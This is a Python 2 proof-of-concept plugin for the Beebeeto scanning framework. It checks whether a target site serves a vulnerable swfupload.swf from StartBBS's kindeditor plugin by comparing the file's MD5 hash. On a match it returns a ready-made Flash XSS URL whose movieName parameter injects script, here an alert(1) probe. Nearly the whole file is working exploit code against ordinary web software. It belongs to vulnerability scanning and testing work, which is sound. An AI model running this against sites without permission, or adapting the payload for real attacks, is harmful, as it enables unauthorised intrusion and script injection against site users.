#!/usr/bin/env python
# coding=utf-8

"""  
Site: http://www.beebeeto.com/  
Framework: https://github.com/n0tr00t/Beebeeto-framework  
"""  

import md5
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):

    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0016',# 由Beebeeto官方编辑
            'name': 'StartBBS /swfupload.swf 跨站脚本漏洞 POC',  # 名称
            'author': 'hang333',  # 作者
            'create_date': '2014-09-22',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'StartBBS',  # 漏洞所涉及的应用名称
            'vul_version': ['1.1.15.*'],  # 受漏洞影响的应用版本
            'type': 'XSS',  # 漏洞类型
            'tag': ['StartBBS', 'flash', 'xss'],  # 漏洞相关tag
            'desc': 'StartBBS 1.1.15.* /plugins/kindeditor/plugins/multiimage/images/swfupload.swf Flash XSS',  # 漏洞描述
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-049457/trace/bbf81ebe07bcc6021c3438868ae51051',  # 参考链接
            ],
        },
  }  

    @classmethod  
    def verify(cls, args):  
        flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"  
        file_path = "/plugins/kindeditor/plugins/multiimage/images/swfupload.swf"  
        verify_url = args['options']['target'] + file_path  
        xss_poc = '?movieName="]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//'
        if args['options']['verbose']:  
            print '[*] Request URL: ' + verify_url  
        request = urllib2.Request(verify_url)  
        response = urllib2.urlopen(request)  
        content = response.read()  
        md5_value = md5.new(content).hexdigest()  
        if md5_value in flash_md5: 
            args['success'] = True  
            args['poc_ret']['xss_url'] = verify_url + xss_poc
            return args  
        else:  
            args['success'] = False  
            return args  
  
    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())